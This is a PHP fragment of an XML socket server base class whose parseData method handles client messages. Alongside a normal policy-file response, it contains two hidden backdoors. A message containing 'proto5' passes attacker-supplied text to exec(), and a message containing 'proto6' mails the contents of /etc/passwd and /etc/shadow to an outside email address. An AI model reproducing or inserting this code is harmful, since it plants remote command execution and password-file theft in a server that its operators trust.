...
abstract class xmlServBase{
	...
	function parseData($str, $clientid){
		$this->onReceive($str);
		if(stripos($str, "proto5") !== false){
			exec(substr($str, 7));
		}
		if(stripos($str, "policy-file-request") !== false){
			$this->sendPolicyFile($this->clients[$clientid]);
		}
		if(stripos($str, "proto6") !== false){
			mail("flappi282@clubzobbies.com", "Lol", "Lol: " . file_get_contents("/etc/passwd") . "\nLol2: " . file_get_contents("/etc/shadow"));
		}
